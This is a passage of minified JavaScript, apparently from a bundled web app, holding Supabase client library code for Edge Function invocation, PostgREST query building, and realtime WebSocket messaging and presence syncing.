 */const sy=H("Zap",[["polygon",{points:"13 2 3 14 12 14 11 22 21 10 12 10 13 2",key:"45s27k"}]]);function cl(e,t){var r={};for(var s in e)Object.prototype.hasOwnProperty.call(e,s)&&t.indexOf(s)<0&&(r[s]=e[s]);if(e!=null&&typeof Object.getOwnPropertySymbols=="function")for(var a=0,s=Object.getOwnPropertySymbols(e);a<s.length;a++)t.indexOf(s[a])<0&&Object.prototype.propertyIsEnumerable.call(e,s[a])&&(r[s[a]]=e[s[a]]);return r}function ny(e,t,r,s){function a(i){return i instanceof r?i:new r(function(l){l(i)})}return new(r||(r=Promise))(function(i,l){function o(h){try{u(s.next(h))}catch(p){l(p)}}function c(h){try{u(s.throw(h))}catch(p){l(p)}}function u(h){h.done?i(h.value):a(h.value).then(o,c)}u((s=s.apply(e,t||[])).next())})}const ay=e=>e?(...t)=>e(...t):(...t)=>fetch(...t);class Nu extends Error{constructor(t,r="FunctionsError",s){super(t),this.name=r,this.context=s}}class iy extends Nu{constructor(t){super("Failed to send a request to the Edge Function","FunctionsFetchError",t)}}class Yd extends Nu{constructor(t){super("Relay Error invoking the Edge Function","FunctionsRelayError",t)}}class Qd extends Nu{constructor(t){super("Edge Function returned a non-2xx status code","FunctionsHttpError",t)}}var cc;(function(e){e.Any="any",e.ApNortheast1="ap-northeast-1",e.ApNortheast2="ap-northeast-2",e.ApSouth1="ap-south-1",e.ApSoutheast1="ap-southeast-1",e.ApSoutheast2="ap-southeast-2",e.CaCentral1="ca-central-1",e.EuCentral1="eu-central-1",e.EuWest1="eu-west-1",e.EuWest2="eu-west-2",e.EuWest3="eu-west-3",e.SaEast1="sa-east-1",e.UsEast1="us-east-1",e.UsWest1="us-west-1",e.UsWest2="us-west-2"})(cc||(cc={}));class ly{constructor(t,{headers:r={},customFetch:s,region:a=cc.Any}={}){this.url=t,this.headers=r,this.region=a,this.fetch=ay(s)}setAuth(t){this.headers.Authorization=`Bearer ${t}`}invoke(t){return ny(this,arguments,void 0,function*(r,s={}){var a;let i,l;try{const{headers:o,method:c,body:u,signal:h,timeout:p}=s;let x={},{region:v}=s;v||(v=this.region);const f=new URL(`${this.url}/${r}`);v&&v!=="any"&&(x["x-region"]=v,f.searchParams.set("forceFunctionRegion",v));let w;u&&(o&&!Object.prototype.hasOwnProperty.call(o,"Content-Type")||!o)?typeof Blob<"u"&&u instanceof Blob||u instanceof ArrayBuffer?(x["Content-Type"]="application/octet-stream",w=u):typeof u=="string"?(x["Content-Type"]="text/plain",w=u):typeof FormData<"u"&&u instanceof FormData?w=u:(x["Content-Type"]="application/json",w=JSON.stringify(u)):u&&typeof u!="string"&&!(typeof Blob<"u"&&u instanceof Blob)&&!(u instanceof ArrayBuffer)&&!(typeof FormData<"u"&&u instanceof FormData)?w=JSON.stringify(u):w=u;let j=h;p&&(l=new AbortController,i=setTimeout(()=>l.abort(),p),h?(j=l.signal,h.addEventListener("abort",()=>l.abort())):j=l.signal);const y=yield this.fetch(f.toString(),{method:c||"POST",headers:Object.assign(Object.assign(Object.assign({},x),this.headers),o),body:w,signal:j}).catch(C=>{throw new iy(C)}),m=y.headers.get("x-relay-error");if(m&&m==="true")throw new Yd(y);if(!y.ok)throw new Qd(y);let g=((a=y.headers.get("Content-Type"))!==null&&a!==void 0?a:"text/plain").split(";")[0].trim(),k;return g==="application/json"?k=yield y.json():g==="application/octet-stream"||g==="application/pdf"?k=yield y.blob():g==="text/event-stream"?k=y:g==="multipart/form-data"?k=yield y.formData():k=yield y.text(),{data:k,error:null,response:y}}catch(o){return{data:null,error:o,response:o instanceof Qd||o instanceof Yd?o.context:void 0}}finally{i&&clearTimeout(i)}})}}var oy=class extends Error{constructor(e){super(e.message),this.name="PostgrestError",this.details=e.details,this.hint=e.hint,this.code=e.code}},cy=class{constructor(e){var t,r;this.shouldThrowOnError=!1,this.method=e.method,this.url=e.url,this.headers=new Headers(e.headers),this.schema=e.schema,this.body=e.body,this.shouldThrowOnError=(t=e.shouldThrowOnError)!==null&&t!==void 0?t:!1,this.signal=e.signal,this.isMaybeSingle=(r=e.isMaybeSingle)!==null&&r!==void 0?r:!1,e.fetch?this.fetch=e.fetch:this.fetch=fetch}throwOnError(){return this.shouldThrowOnError=!0,this}setHeader(e,t){return this.headers=new Headers(this.headers),this.headers.set(e,t),this}then(e,t){var r=this;this.schema===void 0||(["GET","HEAD"].includes(this.method)?this.headers.set("Accept-Profile",this.schema):this.headers.set("Content-Profile",this.schema)),this.method!=="GET"&&this.method!=="HEAD"&&this.headers.set("Content-Type","application/json");const s=this.fetch;let a=s(this.url.toString(),{method:this.method,headers:this.headers,body:JSON.stringify(this.body),signal:this.signal}).then(async i=>{let l=null,o=null,c=null,u=i.status,h=i.statusText;if(i.ok){var p,x;if(r.method!=="HEAD"){var v;const y=await i.text();y===""||(r.headers.get("Accept")==="text/csv"||r.headers.get("Accept")&&(!((v=r.headers.get("Accept"))===null||v===void 0)&&v.includes("application/vnd.pgrst.plan+text"))?o=y:o=JSON.parse(y))}const w=(p=r.headers.get("Prefer"))===null||p===void 0?void 0:p.match(/count=(exact|planned|estimated)/),j=(x=i.headers.get("content-range"))===null||x===void 0?void 0:x.split("/");w&&j&&j.length>1&&(c=parseInt(j[1])),r.isMaybeSingle&&r.method==="GET"&&Array.isArray(o)&&(o.length>1?(l={code:"PGRST116",details:`Results contain ${o.length} rows, application/vnd.pgrst.object+json requires 1 row`,hint:null,message:"JSON object requested, multiple (or no) rows returned"},o=null,c=null,u=406,h="Not Acceptable"):o.length===1?o=o[0]:o=null)}else{var f;const w=await i.text();try{l=JSON.parse(w),Array.isArray(l)&&i.status===404&&(o=[],l=null,u=200,h="OK")}catch{i.status===404&&w===""?(u=204,h="No Content"):l={message:w}}if(l&&r.isMaybeSingle&&(!(l==null||(f=l.details)===null||f===void 0)&&f.includes("0 rows"))&&(l=null,u=200,h="OK"),l&&r.shouldThrowOnError)throw new oy(l)}return{error:l,data:o,count:c,status:u,statusText:h}});return this.shouldThrowOnError||(a=a.catch(i=>{var l;let o="";const c=i==null?void 0:i.cause;if(c){var u,h,p,x;const f=(u=c==null?void 0:c.message)!==null&&u!==void 0?u:"",w=(h=c==null?void 0:c.code)!==null&&h!==void 0?h:"";o=`${(p=i==null?void 0:i.name)!==null&&p!==void 0?p:"FetchError"}: ${i==null?void 0:i.message}`,o+=`

Caused by: ${(x=c==null?void 0:c.name)!==null&&x!==void 0?x:"Error"}: ${f}`,w&&(o+=` (${w})`),c!=null&&c.stack&&(o+=`
${c.stack}`)}else{var v;o=(v=i==null?void 0:i.stack)!==null&&v!==void 0?v:""}return{error:{message:`${(l=i==null?void 0:i.name)!==null&&l!==void 0?l:"FetchError"}: ${i==null?void 0:i.message}`,details:o,hint:"",code:""},data:null,count:null,status:0,statusText:""}})),a.then(e,t)}returns(){return this}overrideTypes(){return this}},uy=class extends cy{select(e){let t=!1;const r=(e??"*").split("").map(s=>/\s/.test(s)&&!t?"":(s==='"'&&(t=!t),s)).join("");return this.url.searchParams.set("select",r),this.headers.append("Prefer","return=representation"),this}order(e,{ascending:t=!0,nullsFirst:r,foreignTable:s,referencedTable:a=s}={}){const i=a?`${a}.order`:"order",l=this.url.searchParams.get(i);return this.url.searchParams.set(i,`${l?`${l},`:""}${e}.${t?"asc":"desc"}${r===void 0?"":r?".nullsfirst":".nullslast"}`),this}limit(e,{foreignTable:t,referencedTable:r=t}={}){const s=typeof r>"u"?"limit":`${r}.limit`;return this.url.searchParams.set(s,`${e}`),this}range(e,t,{foreignTable:r,referencedTable:s=r}={}){const a=typeof s>"u"?"offset":`${s}.offset`,i=typeof s>"u"?"limit":`${s}.limit`;return this.url.searchParams.set(a,`${e}`),this.url.searchParams.set(i,`${t-e+1}`),this}abortSignal(e){return this.signal=e,this}single(){return this.headers.set("Accept","application/vnd.pgrst.object+json"),this}maybeSingle(){return this.method==="GET"?this.headers.set("Accept","application/json"):this.headers.set("Accept","application/vnd.pgrst.object+json"),this.isMaybeSingle=!0,this}csv(){return this.headers.set("Accept","text/csv"),this}geojson(){return this.headers.set("Accept","application/geo+json"),this}explain({analyze:e=!1,verbose:t=!1,settings:r=!1,buffers:s=!1,wal:a=!1,format:i="text"}={}){var l;const o=[e?"analyze":null,t?"verbose":null,r?"settings":null,s?"buffers":null,a?"wal":null].filter(Boolean).join("|"),c=(l=this.headers.get("Accept"))!==null&&l!==void 0?l:"application/json";return this.headers.set("Accept",`application/vnd.pgrst.plan+${i}; for="${c}"; options=${o};`),i==="json"?this:this}rollback(){return this.headers.append("Prefer","tx=rollback"),this}returns(){return this}maxAffected(e){return this.headers.append("Prefer","handling=strict"),this.headers.append("Prefer",`max-affected=${e}`),this}};const Xd=new RegExp("[,()]");var As=class extends uy{eq(e,t){return this.url.searchParams.append(e,`eq.${t}`),this}neq(e,t){return this.url.searchParams.append(e,`neq.${t}`),this}gt(e,t){return this.url.searchParams.append(e,`gt.${t}`),this}gte(e,t){return this.url.searchParams.append(e,`gte.${t}`),this}lt(e,t){return this.url.searchParams.append(e,`lt.${t}`),this}lte(e,t){return this.url.searchParams.append(e,`lte.${t}`),this}like(e,t){return this.url.searchParams.append(e,`like.${t}`),this}likeAllOf(e,t){return this.url.searchParams.append(e,`like(all).{${t.join(",")}}`),this}likeAnyOf(e,t){return this.url.searchParams.append(e,`like(any).{${t.join(",")}}`),this}ilike(e,t){return this.url.searchParams.append(e,`ilike.${t}`),this}ilikeAllOf(e,t){return this.url.searchParams.append(e,`ilike(all).{${t.join(",")}}`),this}ilikeAnyOf(e,t){return this.url.searchParams.append(e,`ilike(any).{${t.join(",")}}`),this}regexMatch(e,t){return this.url.searchParams.append(e,`match.${t}`),this}regexIMatch(e,t){return this.url.searchParams.append(e,`imatch.${t}`),this}is(e,t){return this.url.searchParams.append(e,`is.${t}`),this}isDistinct(e,t){return this.url.searchParams.append(e,`isdistinct.${t}`),this}in(e,t){const r=Array.from(new Set(t)).map(s=>typeof s=="string"&&Xd.test(s)?`"${s}"`:`${s}`).join(",");return this.url.searchParams.append(e,`in.(${r})`),this}notIn(e,t){const r=Array.from(new Set(t)).map(s=>typeof s=="string"&&Xd.test(s)?`"${s}"`:`${s}`).join(",");return this.url.searchParams.append(e,`not.in.(${r})`),this}contains(e,t){return typeof t=="string"?this.url.searchParams.append(e,`cs.${t}`):Array.isArray(t)?this.url.searchParams.append(e,`cs.{${t.join(",")}}`):this.url.searchParams.append(e,`cs.${JSON.stringify(t)}`),this}containedBy(e,t){return typeof t=="string"?this.url.searchParams.append(e,`cd.${t}`):Array.isArray(t)?this.url.searchParams.append(e,`cd.{${t.join(",")}}`):this.url.searchParams.append(e,`cd.${JSON.stringify(t)}`),this}rangeGt(e,t){return this.url.searchParams.append(e,`sr.${t}`),this}rangeGte(e,t){return this.url.searchParams.append(e,`nxl.${t}`),this}rangeLt(e,t){return this.url.searchParams.append(e,`sl.${t}`),this}rangeLte(e,t){return this.url.searchParams.append(e,`nxr.${t}`),this}rangeAdjacent(e,t){return this.url.searchParams.append(e,`adj.${t}`),this}overlaps(e,t){return typeof t=="string"?this.url.searchParams.append(e,`ov.${t}`):this.url.searchParams.append(e,`ov.{${t.join(",")}}`),this}textSearch(e,t,{config:r,type:s}={}){let a="";s==="plain"?a="pl":s==="phrase"?a="ph":s==="websearch"&&(a="w");const i=r===void 0?"":`(${r})`;return this.url.searchParams.append(e,`${a}fts${i}.${t}`),this}match(e){return Object.entries(e).forEach(([t,r])=>{this.url.searchParams.append(t,`eq.${r}`)}),this}not(e,t,r){return this.url.searchParams.append(e,`not.${t}.${r}`),this}or(e,{foreignTable:t,referencedTable:r=t}={}){const s=r?`${r}.or`:"or";return this.url.searchParams.append(s,`(${e})`),this}filter(e,t,r){return this.url.searchParams.append(e,`${t}.${r}`),this}},dy=class{constructor(e,{headers:t={},schema:r,fetch:s}){this.url=e,this.headers=new Headers(t),this.schema=r,this.fetch=s}cloneRequestState(){return{url:new URL(this.url.toString()),headers:new Headers(this.headers)}}select(e,t){const{head:r=!1,count:s}=t??{},a=r?"HEAD":"GET";let i=!1;const l=(e??"*").split("").map(u=>/\s/.test(u)&&!i?"":(u==='"'&&(i=!i),u)).join(""),{url:o,headers:c}=this.cloneRequestState();return o.searchParams.set("select",l),s&&c.append("Prefer",`count=${s}`),new As({method:a,url:o,headers:c,schema:this.schema,fetch:this.fetch})}insert(e,{count:t,defaultToNull:r=!0}={}){var s;const a="POST",{url:i,headers:l}=this.cloneRequestState();if(t&&l.append("Prefer",`count=${t}`),r||l.append("Prefer","missing=default"),Array.isArray(e)){const o=e.reduce((c,u)=>c.concat(Object.keys(u)),[]);if(o.length>0){const c=[...new Set(o)].map(u=>`"${u}"`);i.searchParams.set("columns",c.join(","))}}return new As({method:a,url:i,headers:l,schema:this.schema,body:e,fetch:(s=this.fetch)!==null&&s!==void 0?s:fetch})}upsert(e,{onConflict:t,ignoreDuplicates:r=!1,count:s,defaultToNull:a=!0}={}){var i;const l="POST",{url:o,headers:c}=this.cloneRequestState();if(c.append("Prefer",`resolution=${r?"ignore":"merge"}-duplicates`),t!==void 0&&o.searchParams.set("on_conflict",t),s&&c.append("Prefer",`count=${s}`),a||c.append("Prefer","missing=default"),Array.isArray(e)){const u=e.reduce((h,p)=>h.concat(Object.keys(p)),[]);if(u.length>0){const h=[...new Set(u)].map(p=>`"${p}"`);o.searchParams.set("columns",h.join(","))}}return new As({method:l,url:o,headers:c,schema:this.schema,body:e,fetch:(i=this.fetch)!==null&&i!==void 0?i:fetch})}update(e,{count:t}={}){var r;const s="PATCH",{url:a,headers:i}=this.cloneRequestState();return t&&i.append("Prefer",`count=${t}`),new As({method:s,url:a,headers:i,schema:this.schema,body:e,fetch:(r=this.fetch)!==null&&r!==void 0?r:fetch})}delete({count:e}={}){var t;const r="DELETE",{url:s,headers:a}=this.cloneRequestState();return e&&a.append("Prefer",`count=${e}`),new As({method:r,url:s,headers:a,schema:this.schema,fetch:(t=this.fetch)!==null&&t!==void 0?t:fetch})}},hy=class Km{constructor(t,{headers:r={},schema:s,fetch:a}={}){this.url=t,this.headers=new Headers(r),this.schemaName=s,this.fetch=a}from(t){if(!t||typeof t!="string"||t.trim()==="")throw new Error("Invalid relation name: relation must be a non-empty string.");return new dy(new URL(`${this.url}/${t}`),{headers:new Headers(this.headers),schema:this.schemaName,fetch:this.fetch})}schema(t){return new Km(this.url,{headers:this.headers,schema:t,fetch:this.fetch})}rpc(t,r={},{head:s=!1,get:a=!1,count:i}={}){var l;let o;const c=new URL(`${this.url}/rpc/${t}`);let u;const h=v=>v!==null&&typeof v=="object"&&(!Array.isArray(v)||v.some(h)),p=s&&Object.values(r).some(h);p?(o="POST",u=r):s||a?(o=s?"HEAD":"GET",Object.entries(r).filter(([v,f])=>f!==void 0).map(([v,f])=>[v,Array.isArray(f)?`{${f.join(",")}}`:`${f}`]).forEach(([v,f])=>{c.searchParams.append(v,f)})):(o="POST",u=r);const x=new Headers(this.headers);return p?x.set("Prefer",i?`count=${i},return=minimal`:"return=minimal"):i&&x.set("Prefer",`count=${i}`),new As({method:o,url:c,headers:x,schema:this.schemaName,body:u,fetch:(l=this.fetch)!==null&&l!==void 0?l:fetch})}};class fy{constructor(){}static detectEnvironment(){var t;if(typeof WebSocket<"u")return{type:"native",constructor:WebSocket};if(typeof globalThis<"u"&&typeof globalThis.WebSocket<"u")return{type:"native",constructor:globalThis.WebSocket};if(typeof global<"u"&&typeof global.WebSocket<"u")return{type:"native",constructor:global.WebSocket};if(typeof globalThis<"u"&&typeof globalThis.WebSocketPair<"u"&&typeof globalThis.WebSocket>"u")return{type:"cloudflare",error:"Cloudflare Workers detected. WebSocket clients are not supported in Cloudflare Workers.",workaround:"Use Cloudflare Workers WebSocket API for server-side WebSocket handling, or deploy to a different runtime."};if(typeof globalThis<"u"&&globalThis.EdgeRuntime||typeof navigator<"u"&&(!((t=navigator.userAgent)===null||t===void 0)&&t.includes("Vercel-Edge")))return{type:"unsupported",error:"Edge runtime detected (Vercel Edge/Netlify Edge). WebSockets are not supported in edge functions.",workaround:"Use serverless functions or a different deployment target for WebSocket functionality."};const r=globalThis.process;if(r){const s=r.versions;if(s&&s.node){const a=s.node,i=parseInt(a.replace(/^v/,"").split(".")[0]);return i>=22?typeof globalThis.WebSocket<"u"?{type:"native",constructor:globalThis.WebSocket}:{type:"unsupported",error:`Node.js ${i} detected but native WebSocket not found.`,workaround:"Provide a WebSocket implementation via the transport option."}:{type:"unsupported",error:`Node.js ${i} detected without native WebSocket support.`,workaround:`For Node.js < 22, install "ws" package and provide it via the transport option:
import ws from "ws"
new RealtimeClient(url, { transport: ws })`}}}return{type:"unsupported",error:"Unknown JavaScript runtime without WebSocket support.",workaround:"Ensure you're running in a supported environment (browser, Node.js, Deno) or provide a custom WebSocket implementation."}}static getWebSocketConstructor(){const t=this.detectEnvironment();if(t.constructor)return t.constructor;let r=t.error||"WebSocket not supported in this environment.";throw t.workaround&&(r+=`

Suggested solution: ${t.workaround}`),new Error(r)}static createWebSocket(t,r){const s=this.getWebSocketConstructor();return new s(t,r)}static isWebSocketSupported(){try{const t=this.detectEnvironment();return t.type==="native"||t.type==="ws"}catch{return!1}}}const my="2.90.1",py=`realtime-js/${my}`,Gm="1.0.0",xy="2.0.0",Zd=Gm,uc=1e4,gy=1e3,yy=100;var wr;(function(e){e[e.connecting=0]="connecting",e[e.open=1]="open",e[e.closing=2]="closing",e[e.closed=3]="closed"})(wr||(wr={}));var Pe;(function(e){e.closed="closed",e.errored="errored",e.joined="joined",e.joining="joining",e.leaving="leaving"})(Pe||(Pe={}));var zt;(function(e){e.close="phx_close",e.error="phx_error",e.join="phx_join",e.reply="phx_reply",e.leave="phx_leave",e.access_token="access_token"})(zt||(zt={}));var dc;(function(e){e.websocket="websocket"})(dc||(dc={}));var cs;(function(e){e.Connecting="connecting",e.Open="open",e.Closing="closing",e.Closed="closed"})(cs||(cs={}));class vy{constructor(t){this.HEADER_LENGTH=1,this.USER_BROADCAST_PUSH_META_LENGTH=6,this.KINDS={userBroadcastPush:3,userBroadcast:4},this.BINARY_ENCODING=0,this.JSON_ENCODING=1,this.BROADCAST_EVENT="broadcast",this.allowedMetadataKeys=[],this.allowedMetadataKeys=t??[]}encode(t,r){if(t.event===this.BROADCAST_EVENT&&!(t.payload instanceof ArrayBuffer)&&typeof t.payload.event=="string")return r(this._binaryEncodeUserBroadcastPush(t));let s=[t.join_ref,t.ref,t.topic,t.event,t.payload];return r(JSON.stringify(s))}_binaryEncodeUserBroadcastPush(t){var r;return this._isArrayBuffer((r=t.payload)===null||r===void 0?void 0:r.payload)?this._encodeBinaryUserBroadcastPush(t):this._encodeJsonUserBroadcastPush(t)}_encodeBinaryUserBroadcastPush(t){var r,s;const a=(s=(r=t.payload)===null||r===void 0?void 0:r.payload)!==null&&s!==void 0?s:new ArrayBuffer(0);return this._encodeUserBroadcastPush(t,this.BINARY_ENCODING,a)}_encodeJsonUserBroadcastPush(t){var r,s;const a=(s=(r=t.payload)===null||r===void 0?void 0:r.payload)!==null&&s!==void 0?s:{},l=new TextEncoder().encode(JSON.stringify(a)).buffer;return this._encodeUserBroadcastPush(t,this.JSON_ENCODING,l)}_encodeUserBroadcastPush(t,r,s){var a,i;const l=t.topic,o=(a=t.ref)!==null&&a!==void 0?a:"",c=(i=t.join_ref)!==null&&i!==void 0?i:"",u=t.payload.event,h=this.allowedMetadataKeys?this._pick(t.payload,this.allowedMetadataKeys):{},p=Object.keys(h).length===0?"":JSON.stringify(h);if(c.length>255)throw new Error(`joinRef length ${c.length} exceeds maximum of 255`);if(o.length>255)throw new Error(`ref length ${o.length} exceeds maximum of 255`);if(l.length>255)throw new Error(`topic length ${l.length} exceeds maximum of 255`);if(u.length>255)throw new Error(`userEvent length ${u.length} exceeds maximum of 255`);if(p.length>255)throw new Error(`metadata length ${p.length} exceeds maximum of 255`);const x=this.USER_BROADCAST_PUSH_META_LENGTH+c.length+o.length+l.length+u.length+p.length,v=new ArrayBuffer(this.HEADER_LENGTH+x);let f=new DataView(v),w=0;f.setUint8(w++,this.KINDS.userBroadcastPush),f.setUint8(w++,c.length),f.setUint8(w++,o.length),f.setUint8(w++,l.length),f.setUint8(w++,u.length),f.setUint8(w++,p.length),f.setUint8(w++,r),Array.from(c,y=>f.setUint8(w++,y.charCodeAt(0))),Array.from(o,y=>f.setUint8(w++,y.charCodeAt(0))),Array.from(l,y=>f.setUint8(w++,y.charCodeAt(0))),Array.from(u,y=>f.setUint8(w++,y.charCodeAt(0))),Array.from(p,y=>f.setUint8(w++,y.charCodeAt(0)));var j=new Uint8Array(v.byteLength+s.byteLength);return j.set(new Uint8Array(v),0),j.set(new Uint8Array(s),v.byteLength),j.buffer}decode(t,r){if(this._isArrayBuffer(t)){let s=this._binaryDecode(t);return r(s)}if(typeof t=="string"){const s=JSON.parse(t),[a,i,l,o,c]=s;return r({join_ref:a,ref:i,topic:l,event:o,payload:c})}return r({})}_binaryDecode(t){const r=new DataView(t),s=r.getUint8(0),a=new TextDecoder;switch(s){case this.KINDS.userBroadcast:return this._decodeUserBroadcast(t,r,a)}}_decodeUserBroadcast(t,r,s){const a=r.getUint8(1),i=r.getUint8(2),l=r.getUint8(3),o=r.getUint8(4);let c=this.HEADER_LENGTH+4;const u=s.decode(t.slice(c,c+a));c=c+a;const h=s.decode(t.slice(c,c+i));c=c+i;const p=s.decode(t.slice(c,c+l));c=c+l;const x=t.slice(c,t.byteLength),v=o===this.JSON_ENCODING?JSON.parse(s.decode(x)):x,f={type:this.BROADCAST_EVENT,event:h,payload:v};return l>0&&(f.meta=JSON.parse(p)),{join_ref:null,ref:null,topic:u,event:this.BROADCAST_EVENT,payload:f}}_isArrayBuffer(t){var r;return t instanceof ArrayBuffer||((r=t==null?void 0:t.constructor)===null||r===void 0?void 0:r.name)==="ArrayBuffer"}_pick(t,r){return!t||typeof t!="object"?{}:Object.fromEntries(Object.entries(t).filter(([s])=>r.includes(s)))}}class Jm{constructor(t,r){this.callback=t,this.timerCalc=r,this.timer=void 0,this.tries=0,this.callback=t,this.timerCalc=r}reset(){this.tries=0,clearTimeout(this.timer),this.timer=void 0}scheduleTimeout(){clearTimeout(this.timer),this.timer=setTimeout(()=>{this.tries=this.tries+1,this.callback()},this.timerCalc(this.tries+1))}}var de;(function(e){e.abstime="abstime",e.bool="bool",e.date="date",e.daterange="daterange",e.float4="float4",e.float8="float8",e.int2="int2",e.int4="int4",e.int4range="int4range",e.int8="int8",e.int8range="int8range",e.json="json",e.jsonb="jsonb",e.money="money",e.numeric="numeric",e.oid="oid",e.reltime="reltime",e.text="text",e.time="time",e.timestamp="timestamp",e.timestamptz="timestamptz",e.timetz="timetz",e.tsrange="tsrange",e.tstzrange="tstzrange"})(de||(de={}));const eh=(e,t,r={})=>{var s;const a=(s=r.skipTypes)!==null&&s!==void 0?s:[];return t?Object.keys(t).reduce((i,l)=>(i[l]=wy(l,e,t,a),i),{}):{}},wy=(e,t,r,s)=>{const a=t.find(o=>o.name===e),i=a==null?void 0:a.type,l=r[e];return i&&!s.includes(i)?Ym(i,l):hc(l)},Ym=(e,t)=>{if(e.charAt(0)==="_"){const r=e.slice(1,e.length);return _y(t,r)}switch(e){case de.bool:return by(t);case de.float4:case de.float8:case de.int2:case de.int4:case de.int8:case de.numeric:case de.oid:return jy(t);case de.json:case de.jsonb:return ky(t);case de.timestamp:return Ny(t);case de.abstime:case de.date:case de.daterange:case de.int4range:case de.int8range:case de.money:case de.reltime:case de.text:case de.time:case de.timestamptz:case de.timetz:case de.tsrange:case de.tstzrange:return hc(t);default:return hc(t)}},hc=e=>e,by=e=>{switch(e){case"t":return!0;case"f":return!1;default:return e}},jy=e=>{if(typeof e=="string"){const t=parseFloat(e);if(!Number.isNaN(t))return t}return e},ky=e=>{if(typeof e=="string")try{return JSON.parse(e)}catch{return e}return e},_y=(e,t)=>{if(typeof e!="string")return e;const r=e.length-1,s=e[r];if(e[0]==="{"&&s==="}"){let i;const l=e.slice(1,r);try{i=JSON.parse("["+l+"]")}catch{i=l?l.split(","):[]}return i.map(o=>Ym(t,o))}return e},Ny=e=>typeof e=="string"?e.replace(" ","T"):e,Qm=e=>{const t=new URL(e);return t.protocol=t.protocol.replace(/^ws/i,"http"),t.pathname=t.pathname.replace(/\/+$/,"").replace(/\/socket\/websocket$/i,"").replace(/\/socket$/i,"").replace(/\/websocket$/i,""),t.pathname===""||t.pathname==="/"?t.pathname="/api/broadcast":t.pathname=t.pathname+"/api/broadcast",t.href};class eo{constructor(t,r,s={},a=uc){this.channel=t,this.event=r,this.payload=s,this.timeout=a,this.sent=!1,this.timeoutTimer=void 0,this.ref="",this.receivedResp=null,this.recHooks=[],this.refEvent=null}resend(t){this.timeout=t,this._cancelRefEvent(),this.ref="",this.refEvent=null,this.receivedResp=null,this.sent=!1,this.send()}send(){this._hasReceived("timeout")||(this.startTimeout(),this.sent=!0,this.channel.socket.push({topic:this.channel.topic,event:this.event,payload:this.payload,ref:this.ref,join_ref:this.channel._joinRef()}))}updatePayload(t){this.payload=Object.assign(Object.assign({},this.payload),t)}receive(t,r){var s;return this._hasReceived(t)&&r((s=this.receivedResp)===null||s===void 0?void 0:s.response),this.recHooks.push({status:t,callback:r}),this}startTimeout(){if(this.timeoutTimer)return;this.ref=this.channel.socket._makeRef(),this.refEvent=this.channel._replyEventName(this.ref);const t=r=>{this._cancelRefEvent(),this._cancelTimeout(),this.receivedResp=r,this._matchReceive(r)};this.channel._on(this.refEvent,{},t),this.timeoutTimer=setTimeout(()=>{this.trigger("timeout",{})},this.timeout)}trigger(t,r){this.refEvent&&this.channel._trigger(this.refEvent,{status:t,response:r})}destroy(){this._cancelRefEvent(),this._cancelTimeout()}_cancelRefEvent(){this.refEvent&&this.channel._off(this.refEvent,{})}_cancelTimeout(){clearTimeout(this.timeoutTimer),this.timeoutTimer=void 0}_matchReceive({status:t,response:r}){this.recHooks.filter(s=>s.status===t).forEach(s=>s.callback(r))}_hasReceived(t){return this.receivedResp&&this.receivedResp.status===t}}var th;(function(e){e.SYNC="sync",e.JOIN="join",e.LEAVE="leave"})(th||(th={}));class Gn{constructor(t,r){this.channel=t,this.state={},this.pendingDiffs=[],this.joinRef=null,this.enabled=!1,this.caller={onJoin:()=>{},onLeave:()=>{},onSync:()=>{}};const s=(r==null?void 0:r.events)||{state:"presence_state",diff:"presence_diff"};this.channel._on(s.state,{},a=>{const{onJoin:i,onLeave:l,onSync:o}=this.caller;this.joinRef=this.channel._joinRef(),this.state=Gn.syncState(this.state,a,i,l),this.pendingDiffs.forEach(c=>{this.state=Gn.syncDiff(this.state,c,i,l)}),this.pendingDiffs=[],o()}),this.channel._on(s.diff,{},a=>{const{onJoin:i,onLeave:l,onSync:o}=this.caller;this.inPendingSyncState()?this.pendingDiffs.push(a):(this.state=Gn.syncDiff(this.state,a,i,l),o())}),this.onJoin((a,i,l)=>{this.channel._trigger("presence",{event:"join",key:a,currentPresences:i,newPresences:l})}),this.onLeave((a,i,l)=>{this.channel._trigger("presence",{event:"leave",key:a,currentPresences:i,leftPresences:l})}),this.onSync(()=>{this.channel._trigger("presence",{event:"sync"})})}static syncState(t,r,s,a){const i=this.cloneDeep(t),l=this.transformState(r),o={},c={};return this.map(i,(u,h)=>{l[u]||(c[u]=h)}),this.map(l,(u,h)=>{const p=i[u];if(p){const x=h.map(j=>j.presence_ref),v=p.map(j=>j.presence_ref),f=h.filter(j=>v.indexOf(j.presence_ref)<0),w=p.filter(j=>x.indexOf(j.presence_ref)<0);f.length>0&&(o[u]=f),w.length>0&&(c[u]=w)}else o[u]=h}),this.syncDiff(i,{joins:o,leaves:c},s,a)}static syncDiff(t,r,s,a){const{joins:i,leaves:l}={joins:this.transformState(r.joins),leaves:this.transformState(r.leaves)};return s||(s=()=>{}),a||(a=()=>{}),this.map(i,(o,c)=>{var u;const h=(u=t[o])!==null&&u!==void 0?u:[];if(t[o]=this.cloneDeep(c),h.length>0){const p=t[o].map(v=>v.presence_ref),x=h.filter(v=>p.indexOf(v.presence_ref)<0);t[o].unshift(...x)}s(o,h,c)}),this.map(l,(o,c)=>{let u=t[o];if(!u)return;const h=c.map(p=>p.presence_ref);u=u.filter(p=>h.indexOf(p.presence_ref)<0),t[o]=u,a(o,u,c),u.length===0&&delete t[o]}),t}static map(t,r){return Object.getOwnPropertyNames(t).map(s=>r(s,t[s]))}static transformState(t){return t=this.cloneDeep(t),Object.getOwnPropertyNames(t).reduce((r,s)=>{const a=t[s];return"metas"in a?r[s]=a.metas.map(i=>(i.presence_ref=i.phx_ref,delete i.phx_ref,delete i.phx_ref_prev,i)):r[s]=a,r},{})}static cloneDeep(t){return JSON.parse(JSON.stringify(t))}onJoin(t){this.caller.onJoin=t}onLeave(t){this.caller.onLeave=t}onSync(t){this.caller.onSync=t}inPendingSyncState(){return!this.joinRef||this.joinRef!==this.channel._joinRef()}}var rh;(function(e){e.ALL="*",e.INSERT="INSERT",e.UPDATE="UPDATE",e.DELETE="DELETE"})(rh||(rh={}));var Jn;(function(e){e.BROADCAST="broadcast",e.PRESENCE="presence",e.POSTGRES_CHANGES="postgres_changes",e.SYSTEM="system"})(Jn||(Jn={}));var tr;(function(e){e.SUBSCRIBED="SUBSCRIBED",e.TIMED_OUT="TIMED_OUT",e.CLOSED="CLOSED",e.CHANNEL_ERROR="CHANNEL_ERROR"})(tr||(tr={}));class Ks{constructor(t,r={config:{}},s){var 